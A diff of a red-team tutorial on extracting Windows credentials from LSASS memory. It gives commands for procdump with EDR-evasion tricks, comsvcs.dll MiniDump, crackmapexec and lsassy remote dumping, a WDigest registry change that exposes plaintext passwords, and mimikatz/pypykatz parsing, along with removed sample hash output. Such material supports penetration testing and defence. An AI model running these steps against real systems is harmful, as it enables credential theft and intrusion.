@@ -35,7 +35,7 @@ This will create a dump file in the user's `C:\Users\0xhav0c\AppData\Local\Temp`
 
 ![Untitled](/assets/img/pitcures/red-team/dumplsass2.png)
 
-## Method 2- Getting LSASS Dump with PROCDUMP
+## Method 2- Getting LSASS Dump with ProcDump
 
 [Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is a Windows SysInternals tool that can be used to create memory dumps of processes. The disadvantage of this method is that you have to copy the Procdump executable to the target machine, and some organizations warn the binary as malicious.
 
@@ -44,6 +44,14 @@ To create a LSASS memory dump:
 ```bash
 PS C:\Users\0xhav0c> procdump.exe -accepteula -ma lsass.exe out.dmp
 ```
+![Downloading ProcDump on victim machine with evil-winrm session](/assets/img/pitcures/red-team/dumplsass3.png)
+_Downloading ProcDump on victim machine with evil-winrm session_
+
+![Simple web server on attacker machine for share procdump files](/assets/img/pitcures/red-team/dumplsass4.png)
+_Simple web server on attacker machine for share procdump files_
+
+![Getting LSASS Dump with ProcDump.exe](/assets/img/pitcures/red-team/dumplsass5.png)
+_Getting LSASS Dump with ProcDump.exe_
 
 Some EDR solutions warn or block this based on the `lsass` process name. This can usually be bypassed by specifying the LSASS transaction ID instead.
 
@@ -51,30 +59,37 @@ To get the LSASS process ID via PowerShell:
 
 ```bash
 PS C:\Users\0xhav0c> get-process lsass
- 
-Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName
--------  ------    -----      -----     ------     --  -- -----------
-   1296      26     7148      51752               580   0 lsass
 ```
+
+![Finding lsass.exe PID with Powershell](/assets/img/pitcures/red-team/dumplsass6.png)
+_Finding lsass.exe PID with Powershell_
 
 To get the LSASS process ID with CMD:
 
 ```bash
 C:\Users\0xhav0c> tasklist | findstr lsass
-lsass.exe                      580 Services                   0     51,752 K
 ```
+
+![Finding lsass.exe PID with CMD](/assets/img/pitcures/red-team/dumplsass7.png)
+_finding lsass.exe PID with CMD_
 
 Then dump the findstr value with the same procdump:
 
 ```bash
-C:\Users\0xhav0c> procdump.exe -accepteula -ma 580 out.dmp
+C:\Users\0xhav0c> procdump.exe -accepteula -ma 528 out.dmp
 ```
+
+![Dumping lsass.exe with procdump.exe after finding lsass.exe PID](/assets/img/pitcures/red-team/dumplsass8.png)
 
 Additionally, depending on the EDR, you can simply add quotes around the transaction name
 
 ```bash
 PS C:\Users\0xhav0c> procdump.exe -accepteula -ma “lsass.exe” out.dmp
+#or
+PS C:\Users\0xhav0c> procdump.exe -accepteula -ma 'lsass.exe' out.dmp
 ```
+
+![Untitled](/assets/img/pitcures/red-team/dumplsass9.png)
 
 ## Method 3- Getting LSASS Dump with Comsvcs
 
@@ -83,10 +98,14 @@ With Comsvcs you can create a memory dump using native libraries available on Wi
 ```bash
 # Detect the PID for lsass.exe
 PS C:\Users\0xhav0c> tasklist | findstr lsass
-lsass.exe                      580 Services                   0     51,752 K
+lsass.exe                      524 Services                   0     51,752 K
 # Dumping LSASS.exe
-PS C:\Users\0xhav0c> C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 580 C:\temp\out.dmp full
+PS C:\Users\0xhav0c> C:\Windows\System32\rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 524 C:\temp\out.dmp full
 ```
+
+![Finding lsass.exe pid and getting LSASS dump with Comsvcs.](/assets/img/pitcures/red-team/dumplsass10.png)
+_Finding lsass.exe pid and getting LSASS dump with Comsvcs._
+
 
 ## Method 4- Getting LSASS Dump with Crackmapexec
 
@@ -94,16 +113,12 @@ Crackmapexec is an excellent tool for performing a LSASS dump remotely. With cre
 
 ```bash
 crackmapexec smb 192.168.x.x -u 0xhav0c -p Password123! --lsa
-SMB         192.168.x.x    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:secybr.com) (signing:True) (SMBv1:True)
-SMB         192.168.x.x    445    DC               [+] secybr.com\0xhav0c:Password123! (Pwn3d!)
-SMB         192.168.x.x    445    DC               [+] Dumping LSA secrets
-SMB         192.168.x.x    445    DC               secybr.com\DC$:aes256-cts-hmac-sha1-96:5a0f8706487aae9bf38161a4608e7567ac1c4a105226b783ccbd98274c8d4018
-SMB         192.168.x.x    445    DC               secybr.com\DC$:aes128-cts-hmac-sha1-96:d8402dda8272520b01ba6b8dcfd9b3d8
-SMB         192.168.x.x    445    DC               secybr.com\DC$:des-cbc-md5:f45b2361ae1ad308
-SMB         192.168.x.x    445    DC               secybr.com\DC$:plain_password_hex:4e4545a05fe307150e0679cf4169caea359467422908fec7e82b6eb63d23dfa9cb180c4c3da62ff7ce1ab1396b1fa505300bed8d7a67e36b74ab9b25721756181c47850cf9dc220964ae7c50a104cfed776f5c1cb8865bb443d9d757cd90dc1dca063ba89776825f20d7d61b7debfb5339cd69dc3c3c81b0e81c6b74065d4456a6339991fd05a5e687cd8fd0f81562a3613f7094015ab82ca0e16fca01551fdef5f397f48664cb64801215b453d29c1034aca75242c3be6aa080dd6be94ca91f712db8c6d4ca6305ee47912fa5a11bc388388fde380c3d9a712d6c8fe36b50c3cdedc4cae98d75eb9561c0a8ec13a0da
-SMB         192.168.x.x    445    DC               secybr.com\DC$:aad3b435b51404eeaad3b435b51404ee:6e93dbc1944a24129c85324692f4687b:::
-SMB         192.168.x.x    445    DC               [+] Dumped 7 LSA secrets to /home/t/.cme/logs/DC_192.168.x.x_2022-06-30_134314.secrets and /home/t/.cme/logs/DC_192.168.x.x_2022-06-30_134314.cached
 ```
+![Getting LSASS dump with Crackmapexec.](/assets/img/pitcures/red-team/dumplsass11.png)
+_Getting LSASS dump with Crackmapexec._
+
+![stored hashes and plaintext password outputs.](/assets/img/pitcures/red-team/dumplsass12.png)
+_Stored hashes and plaintext password outputs._
 
 > If Crackmapexec catches hashes and plaintext passwords, it will keep it in its home directory under `~/.cme/logs/`.
 {: .prompt-tip }
@@ -111,27 +126,16 @@ SMB         192.168.x.x    445    DC               [+] Dumped 7 LSA secrets to /
 
 CrackMapExec uses Impacket's [secretsdump.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) to dump LSASS.
 
-## Method 5- Getting LSASS Dump with LSASSY
+## Method 5- Getting LSASS Dump with lsassy
 
 [Lsassy](https://github.com/Hackndo/lsassy) is a tool that uses a combination of the above methods to offload LSASS remotely. The default command attempts to use the `comsvcs.dll` method to offload LSASS with WMI or a remote scheduled task:
 
 ```bash
 └─$ lsassy -d secybr.com -u 0xhav0c -p Password123! 192.168.x.x
-[+] [192.168.x.x] secybr.com\0xhav0c  58a478135a93ac3bf058a5ea0e8fdb71[+] [192.168.x.x] secybr.com\0xhav0c  Password123!
 ```
 
-Additionally, Lsassy is integrated into Crackmapexec, giving you a nice clean output of just NTLM hashes or plain text credentials. 
-
-> The disadvantage of this method over the `–lsa` method is that it does not automatically store the results in the Crackmapexec logs directory.
-{: .prompt-info }
-
-```bash
-└─$ crackmapexec smb 192.168.x.x -u 0xhav0c -p 'Password123!' -M lsassy
-SMB         192.168.x.x    445    DC               [*] Windows Server 2012 R2 Standard 9600 x64 (name:DC) (domain:secybr.com) (signing:True) (SMBv1:True)
-SMB         192.168.x.x    445    DC               [+] secybr.com\0xhav0c:Password123! (Pwn3d!)
-LSASSY      192.168.x.x    445    DC               secybr.com\0xhav0c 58a478135a93ac3bf058a5ea0e8fdb71
-LSASSY      192.168.x.x    445    DC               secybr.com\0xhav0c Password123!
-```
+![Getting LSASS dump with lsassy](/assets/img/pitcures/red-team/dumplsass14.png)
+_Getting LSASS dump with lsassy_
 
 The methods shown up to this section were for devices that hold hashes and plaintext credentials.
 
@@ -142,7 +146,11 @@ WDigest is disabled on newer machines. It is possible for attackers to enable th
 ```bash
 C:\Users\0xhav0c> reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /d 1
 ```
+![Entering a registry key.](/assets/img/pitcures/red-team/dumplsass15.png)
+_Enabling Wdigest with entering a registry key._
 
+![On victim machine: Attached registry image.](/assets/img/pitcures/red-team/dumplsass16.png)
+_On victim machine: Attached registry image._
 Additionally, this can be done remotely with Crackmapexec:
 
 ```bash
@@ -169,7 +177,8 @@ Once you have the dump file, you can transfer it to the device where you can use
 ```bash
 └─$ pypykatz lsa minidump lsass.DMP
 ```
-
+![Examining dump files using pypkatz (Since the output is long, it is shared to the terminal.)](/assets/img/pitcures/red-team/dumplsass18.png)
+_Examining dump files using pypkatz (Since the output is long, it is shared to the terminal.)_
 ## Method 2 - Examining Dump Files using mimikatz.exe
 
 After obtaining the dump file, download Mimikaz on a windows device that belongs to you.
@@ -183,3 +192,5 @@ After obtaining the dump file, download Mimikaz on a windows device that belongs
 sekurlsa::minidump lsass.DMP
 sekurlsa::logonPasswords
 ```
+![Examining dump files with mimikatz.exe](/assets/img/pitcures/red-team/dumplsass19.png)
+_Examining dump files with mimikatz.exe_
